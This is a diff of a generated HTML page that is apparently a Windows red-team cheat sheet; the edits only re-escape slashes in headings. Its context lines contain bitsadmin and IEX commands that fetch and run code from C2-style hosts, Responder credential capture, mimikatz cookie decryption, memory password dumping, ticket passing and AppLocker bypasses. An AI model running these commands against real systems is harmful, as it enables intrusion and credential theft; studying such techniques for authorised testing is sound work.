@@ -418,7 +418,7 @@ $fileContentBytes &#x3D; [System.Text.Encoding]::UTF8.GetBytes($fileContent)
 $fileContentEncoded &#x3D; [System.Convert]::ToBase64String($fileContentBytes)
 $fileContentEncoded | set-content ($fileName + &quot;.b64&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="Secure-Copy-pscp-exe"><a href="#Secure-Copy-pscp-exe" class="headerlink" title="Secure Copy / pscp.exe"></a>Secure Copy / pscp.exe</h4><pre class="line-numbers language-none"><code class="language-none">pscp.exe C:\Users\Public\m0chan.txt user@target:&#x2F;tmp&#x2F;m0chan.txt
+<h4 id="Secure-Copy-x2F-pscp-exe"><a href="#Secure-Copy-x2F-pscp-exe" class="headerlink" title="Secure Copy &#x2F; pscp.exe"></a>Secure Copy &#x2F; pscp.exe</h4><pre class="line-numbers language-none"><code class="language-none">pscp.exe C:\Users\Public\m0chan.txt user@target:&#x2F;tmp&#x2F;m0chan.txt
 pscp.exe user@target:&#x2F;home&#x2F;user&#x2F;m0chan.txt C:\Users\Public\m0chan.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <h4 id="BitsAdmin-exe"><a href="#BitsAdmin-exe" class="headerlink" title="BitsAdmin.exe"></a>BitsAdmin.exe</h4><pre class="line-numbers language-none"><code class="language-none">cmd.exe &#x2F;c &quot;bitsadmin.exe &#x2F;transfer downld_job &#x2F;download &#x2F;priority high http:&#x2F;&#x2F;c2.m0chan.com C:\Temp\mimikatz.exe &amp; start C:\Temp\binary.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -445,7 +445,7 @@ IEX(curl http:&#x2F;&#x2F;server&#x2F;script.ps1);Invoke-Blah<span aria-hidden="
 
 <h4 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h4><pre class="line-numbers language-none"><code class="language-none">python smbserver.py Share &#96;pwd&#96; -u m0chan -p m0chan --smb-2support<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h4 id="LLMNR-NBT-NS-Spoofing"><a href="#LLMNR-NBT-NS-Spoofing" class="headerlink" title="LLMNR / NBT-NS Spoofing"></a>LLMNR / NBT-NS Spoofing</h4><pre class="line-numbers language-none"><code class="language-none">#Responder to Steal Creds
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h4 id="LLMNR-x2F-NBT-NS-Spoofing"><a href="#LLMNR-x2F-NBT-NS-Spoofing" class="headerlink" title="LLMNR &#x2F; NBT-NS Spoofing"></a>LLMNR &#x2F; NBT-NS Spoofing</h4><pre class="line-numbers language-none"><code class="language-none">#Responder to Steal Creds
 
 git clone https:&#x2F;&#x2F;github.com&#x2F;SpiderLabs&#x2F;Responder.git python Responder.py -i local-ip -I eth0
 
@@ -1123,7 +1123,7 @@ mimikatz dpapi::chrome &#x2F;in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrom
 
 mimikatz dpapi::chrome &#x2F;in:&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot; &#x2F;unprotect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="Dump-Process-Memory-w-Mimikittenz"><a href="#Dump-Process-Memory-w-Mimikittenz" class="headerlink" title="Dump Process Memory w/ Mimikittenz"></a>Dump Process Memory w/ Mimikittenz</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;putterpanda&#x2F;mimikittenz
+<h4 id="Dump-Process-Memory-w-x2F-Mimikittenz"><a href="#Dump-Process-Memory-w-x2F-Mimikittenz" class="headerlink" title="Dump Process Memory w&#x2F; Mimikittenz"></a>Dump Process Memory w&#x2F; Mimikittenz</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;putterpanda&#x2F;mimikittenz
 
 mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.
 
@@ -1186,7 +1186,7 @@ More at the bottom re. Reflectively Loading stuff. (Also does not hurt to change
 
 https:&#x2F;&#x2F;github.com&#x2F;rasta-mouse&#x2F;Watson<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="Decrypt-EFS-Files-with-Mimikatz-if-Admin-System"><a href="#Decrypt-EFS-Files-with-Mimikatz-if-Admin-System" class="headerlink" title="Decrypt EFS Files with Mimikatz if Admin/System"></a>Decrypt EFS Files with Mimikatz if Admin/System</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz&#x2F;wiki&#x2F;howto-~-decrypt-EFS-files
+<h4 id="Decrypt-EFS-Files-with-Mimikatz-if-Admin-x2F-System"><a href="#Decrypt-EFS-Files-with-Mimikatz-if-Admin-x2F-System" class="headerlink" title="Decrypt EFS Files with Mimikatz if Admin&#x2F;System"></a>Decrypt EFS Files with Mimikatz if Admin&#x2F;System</h4><pre class="line-numbers language-none"><code class="language-none">#https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz&#x2F;wiki&#x2F;howto-~-decrypt-EFS-files
 
 cipher &#x2F;c &quot;d:\Users\Gentil Kiwi\Documents\m0chan.txt&quot; - View if File is EFS Encrypted and whom can Decrypt, sometimes Impersonating a token is easier than manually decrying with mimikatz.
 
@@ -1359,7 +1359,7 @@ Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 
 Current User Startup - C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="EXE-DLL-Hijacking"><a href="#EXE-DLL-Hijacking" class="headerlink" title="EXE/DLL Hijacking"></a>EXE/DLL Hijacking</h4><pre class="line-numbers language-none"><code class="language-none">Look for any missing DLL&#39;s or EXE&#39;s that common programs are calling on startup and over write them with your payload&#x2F;malware.
+<h4 id="EXE-x2F-DLL-Hijacking"><a href="#EXE-x2F-DLL-Hijacking" class="headerlink" title="EXE&#x2F;DLL Hijacking"></a>EXE&#x2F;DLL Hijacking</h4><pre class="line-numbers language-none"><code class="language-none">Look for any missing DLL&#39;s or EXE&#39;s that common programs are calling on startup and over write them with your payload&#x2F;malware.
 
 Also if you are localadmin&#x2F;system you could provide over write a normal service binary or DLL, providing you don&#39;t break the execution.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
@@ -1530,7 +1530,7 @@ Rubeus.exe ptt &#x2F;ticket:[base64blobhere]
 
 We can now request TGS service tickets to access network resources as this user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="Obfuscation-Evasion-Techniques"><a href="#Obfuscation-Evasion-Techniques" class="headerlink" title="Obfuscation / Evasion Techniques"></a>Obfuscation / Evasion Techniques</h2><h4 id="Invoke-Obfusaction"><a href="#Invoke-Obfusaction" class="headerlink" title="Invoke-Obfusaction"></a>Invoke-Obfusaction</h4><pre class="line-numbers language-powershell.exe" data-language="powershell.exe"><code class="language-powershell.exe">#https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-Obfuscation
+<h2 id="Obfuscation-x2F-Evasion-Techniques"><a href="#Obfuscation-x2F-Evasion-Techniques" class="headerlink" title="Obfuscation &#x2F; Evasion Techniques"></a>Obfuscation &#x2F; Evasion Techniques</h2><h4 id="Invoke-Obfusaction"><a href="#Invoke-Obfusaction" class="headerlink" title="Invoke-Obfusaction"></a>Invoke-Obfusaction</h4><pre class="line-numbers language-powershell.exe" data-language="powershell.exe"><code class="language-powershell.exe">#https:&#x2F;&#x2F;github.com&#x2F;danielbohannon&#x2F;Invoke-Obfuscation
 
 Can obfusacte Scripts &amp; Commands 
 
@@ -1553,7 +1553,7 @@ IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;c2server.com
 <h4 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h4><p><a target="_blank" rel="noopener" href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a></p>
 <pre class="line-numbers language-none"><code class="language-none">unicorn.py Nishang.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="AppLocker-Constrained-Mode-Bypasses"><a href="#AppLocker-Constrained-Mode-Bypasses" class="headerlink" title="AppLocker / Constrained Mode Bypasses"></a>AppLocker / Constrained Mode Bypasses</h2><h4 id="Verify-is-you-are-in-constrained-mode"><a href="#Verify-is-you-are-in-constrained-mode" class="headerlink" title="Verify is you are in constrained mode"></a>Verify is you are in constrained mode</h4><pre class="line-numbers language-none"><code class="language-none">$ExecutionContext.SessionState.LanguageMode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="AppLocker-x2F-Constrained-Mode-Bypasses"><a href="#AppLocker-x2F-Constrained-Mode-Bypasses" class="headerlink" title="AppLocker &#x2F; Constrained Mode Bypasses"></a>AppLocker &#x2F; Constrained Mode Bypasses</h2><h4 id="Verify-is-you-are-in-constrained-mode"><a href="#Verify-is-you-are-in-constrained-mode" class="headerlink" title="Verify is you are in constrained mode"></a>Verify is you are in constrained mode</h4><pre class="line-numbers language-none"><code class="language-none">$ExecutionContext.SessionState.LanguageMode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="PowershellVeryLess-Bypass"><a href="#PowershellVeryLess-Bypass" class="headerlink" title="PowershellVeryLess Bypass"></a>PowershellVeryLess Bypass</h4><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;decoder-it&#x2F;powershellveryless.git
 
@@ -1603,7 +1603,7 @@ powershell
 
 Where .DLL is your payload i&#x2F;e reverse shell, beacon etc. <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="MSBuild-Powershell-CMD-Bypass"><a href="#MSBuild-Powershell-CMD-Bypass" class="headerlink" title="MSBuild Powershell/CMD Bypass"></a>MSBuild Powershell/CMD Bypass</h4><pre class="line-numbers language-none"><code class="language-none">You can use this if cmd is not disabled but powershell is
+<h4 id="MSBuild-Powershell-x2F-CMD-Bypass"><a href="#MSBuild-Powershell-x2F-CMD-Bypass" class="headerlink" title="MSBuild Powershell&#x2F;CMD Bypass"></a>MSBuild Powershell&#x2F;CMD Bypass</h4><pre class="line-numbers language-none"><code class="language-none">You can use this if cmd is not disabled but powershell is
 
 https:&#x2F;&#x2F;github.com&#x2F;Cn33liz&#x2F;MSBuildShell&#x2F;blob&#x2F;master&#x2F;MSBuildShell.csproj
 
